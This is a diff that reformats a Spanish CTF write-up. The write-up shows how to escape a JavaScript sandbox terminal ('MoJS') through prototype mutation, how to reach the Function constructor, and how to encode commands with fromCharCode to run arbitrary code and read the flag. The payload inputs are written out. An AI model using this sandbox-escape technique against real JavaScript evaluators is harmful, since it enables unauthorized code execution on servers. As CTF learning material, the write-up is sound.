@@ -25,7 +25,7 @@ Con esta información ya deberíamos poder utilizar correctamente la terminal.
 Probamos con `result=help;` y obtenemos en pantalla la función help
 
 
-```
+```javascript
 "function () { return execute.toString(); }"
 ```
 
@@ -38,18 +38,18 @@ Una de las pistas nos recomienda utilizar prototypes y mutar el objeto,
 Javascript objects have prototypes. Mutate the scope.
 Tras innumerables pruebas, se consigue mutar a diferentes tipos, si mutamos a Function podemos utilizar constructor para crear una función propia.
 
-```
-MoJS&gt; __proto__=help;
-MoJS&gt; result=constructor;
+```javascript
+MoJS> __proto__=help;
+MoJS> result=constructor;
 "function Function() { [native code] }"
-MoJS&gt;; result=constructor(123456);
+MoJS> result=constructor(123456);
 "function anonymous() {\n123456\n}"
 ```
 
 Incluso somos capaces de ejecutar la función, aunque de momento es una función que no devuelve nada.
 
 ```
-MoJS&gt; result=constructor(123456)(0);
+MoJS> result=constructor(123456)(0);
 "undefined"
 ```
 
@@ -57,26 +57,26 @@ Nuestro siguiente objetivo es generar un String definido por nosotros para inclu
 
 Para ello mutamos a *String* utilizando la siguiente instrucción, es importante no haber mutado antes a Function.
 
-```
-MoJS&gt; __proto__=constructor(help(0));
+```javascript
+MoJS> __proto__=constructor(help(0));
 "undefined"
-MoJS&gt; result=constructor;
+MoJS> result=constructor;
 "function String() { [native code] }"
 ```
 
 Por ultimo, mutamos a la clase String, donde tendremos acceso a la ansiada función fromCharCode.
 
-```
-MoJS&gt; result=constructor;
+```javascript
+MoJS> result=constructor;
 "function Function() { [native code] }"
-MoJS&gt; result=fromCharCode;
+MoJS> result=fromCharCode;
 "function fromCharCode() { [native code] }"
 ```
 
 Ahora solo nos falta codificar la instrucción JavaScript que queramos ejecutar en el servidor.
 Para ello necesitamos convertir nuestra instrucción a una secuencia de valores decimales y concatenarlos después de utilizar fromCharCode en cada uno de ellos. Por último, utilizamos constructor(instruccion)(0); para crear la función y ejecutarla.
 
-```
+```javascript
 return Object.keys(this);
 
 114,101,116,117,114,110,32,79,98,106,101,99,116,46,107,101,121,115,40,116,104,105,115,41,59
@@ -88,7 +88,7 @@ result=constructor(fromCharCode(114)+fromCharCode(101)+fromCharCode(116)+fromCha
 
 Finalmente repetimos el paso anterior y codificamos la instrucción return fl4g; para obtener el flag.
 
-```
+```javascript
 return fl4g;
 ```
 
